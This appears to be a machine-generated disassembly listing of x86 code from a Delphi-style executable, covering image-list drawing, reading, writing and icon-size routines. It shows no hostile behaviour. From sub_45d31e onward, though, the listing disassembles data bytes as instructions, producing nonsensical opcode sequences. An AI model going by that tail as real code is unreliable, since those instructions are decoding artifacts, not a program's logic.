mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45c198
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41766c
mov eax [ ebp - 0x4 ]
call sub_45ce2c
xor eax eax
push ebp
push sub_45c331
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45c314
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45c2f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4294fc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c2fe
mov eax [ ebp - 0x10 ]
call sub_40331c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_42878c
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_425670
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_425acc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_42878c
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_425670
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_425acc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45bd6c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_45c340
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45bc30
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_45c198
sub_45c360
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
call sub_45bc94
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4192f4
mov eax ebx
call sub_45bee8
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45c548
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_45bc30
mov edx eax
mov eax ebx
call sub_45bbcc
mov eax ebx
call sub_45baf4
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45bc30
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45bafc
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45bc30
push eax
call ImageList_GetBkColor
call sub_45b910
mov edx eax
mov eax ebx
call sub_45bef4
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_45c340
jmp r-xdata
sub_45c420
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4193d8
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45c548
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_45bee8
mov eax esi
call sub_45bc30
mov edx eax
mov eax ebx
call sub_45bbcc
mov eax ebx
call sub_45baf4
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45bc30
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45bafc
jmp r-xdata
mov eax esi
call sub_45bc30
push eax
call ImageList_GetBkColor
call sub_45b910
mov edx eax
mov eax ebx
call sub_45bef4
mov edx esi
mov eax ebx
call sub_45c340
pop esi
pop ebx
retn
sub_45c4d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45c53c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c543
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_45c570
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_418cf8
mov si 0xffff
call sub_403518
inc ebp
dec edi
jne r-xdata
sub_45c5c0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418be8
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418cf8
cmp ebp eax
jne r-xdata
sub_45c618
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_40810c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45c65c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_45be38
mov ebx eax
mov eax edi
call sub_45be38
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_45be38
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45c738
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45c71b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45c618
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c722
mov eax [ ebp - 0xc ]
call sub_40331c
retn
mov eax edi
call sub_45be38
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_45c74c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45be38
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45c65c
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_45c7a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_421df4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_45c74c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45c800
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41b720
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41b720
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45ca84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41b4f4
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41b514
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45ca67
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4294fc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41766c
mov eax [ ebp - 0x4 ]
call sub_45ce2c
xor eax eax
push ebp
push sub_45ca4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca51
mov eax [ ebp - 0xc ]
call sub_40331c
mov eax [ ebp - 0x14 ]
call sub_40331c
mov eax [ ebp - 0x4 ]
call sub_45ce30
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_417694
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_42878c
push eax
mov eax [ ebp - 0xc ]
call sub_42878c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_42553c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_417694
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42878c
push eax
mov eax [ ebp - 0x14 ]
call sub_42878c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_42553c
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45bd6c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45ca94
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422574
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45caf4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45bc04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cafb
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub eax 0xffffffec
sub_45cafb
mov eax [ ebp - 0x4 ]
call sub_45baf4
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45cc2a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b514
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41bc80
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b514
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40331c
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41b514
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422574
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45cc0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41b514
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45bc04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b514
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_45cc5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_45bc94
mov eax edi
call sub_41b4f4
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41b514
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_45c800
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_45ca94
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45cce8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_422574
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cde2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c5dc
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_45bc30
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_45bc30
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cde9
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
jmp r-xdata
sub_45ce50
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
mov edx esi
call sub_45c5c0
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_45ce9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cec1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cec8
retn
sub_45d31e
clc
or eax 0x7f80046
inc esi
add al cl
or [ esi ] al
add [ ecx ] cl
inc esi
add [ eax + 0xd ] ch
inc esi
add [ ebp + ecx + 0x46 ] dl
add [ esi + eax + 0x46 ] dl
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x186b6365
rol [ ebp ] 0x1
cmp eax [ eax ]
add bh bh
mov [ eax ] bl
inc esi
add [ ecx ] al
arpl [ ebx + 0x18 ] bp
insd
dec eax
rol [ ebp ] cl
pop es
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
[ eax + 0x6 ]
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
lodsb [ esi ]
rol [ ebp ] cl
push 0x18004174
add [ 0x756e654d ] al
jae r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
jmp [ edi + eax + 0x10046 ]
insd
popad
jae r-xdata
add bh bh
push 0x3c004606
cmovbe eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop es
inc ebx
popad
jo r-xdata
sbb cl dl
inc ebp
add [ eax + eax ] bh
add bh bh
add al 0x1a
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ edx ] 0x0
add al bh
jne r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
and [ ecx ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
[ edi + eax ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
fadd [ esi ]
inc esi
add [ edi + ecx + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
les edi [ fs : eax + 0x7c0045 ]
add bh bh
sub [ ecx ] dl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x45cf2c70
add [ eax ] cl
add bh bh
pop eax
push es
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ edx + eax * 2 ] bh
add [ esp + ecx + 0x46 ] bl
add ah dh
or al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
imul ebx [ eax ] 0xffffffd1
inc ebp
add [ ebx ] bh
add [ eax ] al
dec [ eax + 0x1004618 ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
pop es
inc esi
add [ esp + ecx + 0x10046 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
dec ebp
cld
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
pushfd
cmovbe eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ eax + ecx * 2 ]
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ eax + 0x8 ]
inc esi
add ah bl
cmovbe eax [ eax ]
add [ eax ] al
add [ eax - 0x1 ] al
adc [ eax ] al
or cl [ ecx + 0x6d ]
popad
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp [ eax ] eax
add bh bh
sub al 0x7
inc esi
add [ edi + ecx + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cmovbe eax [ eax ]
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
adc [ eax ] al
cmp eax 0xccff0000
or eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ecx
outsb
js r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xd06d6574
pop ebp
inc ecx
add [ eax ] ah
add bh bh
xor al 0x8
inc esi
add ah bh
add [ eax ] 0x0
add [ eax ] al
pop ebp
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec [ eax + 0x8 ]
inc esi
add [ eax + edx ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe8656c62
pop ebp
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
ja r-xdata
add [ esi ] bl
xlat
inc ebp
add [ edx ] dh
xlat
inc ebp
add [ eax ] bl
add [ eax ] al
insb
jae r-xdata
je r-xdata
in al dx
add ah ch
and [ edx ] eax
pop eax
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] cl
sbb eax [ esi ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add [ eax ] dh
and eax [ esi ]
int3
xor eax 0x35540040
inc eax
insd
test al 0xd0
inc ebp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
jae r-xdata
jb r-xdata
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x46 ] ch
add [ eax ] bl
and eax [ esi ]
pop esp
sbb eax [ esi ]
dec eax
and eax [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc esi
add ah bl
dec ecx
je r-xdata
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
insd
lea eax [ eax ]
rcl dh 0x1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 ] cl
inc ebp
add [ edi + edx * 8 ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_45d77c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al bl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ ebp ]
pushad
add [ eax ] al
add [ esi + edx * 8 + 0x21ec0045 ] al
inc edx
add [ eax + 0x35 ] bl
inc eax
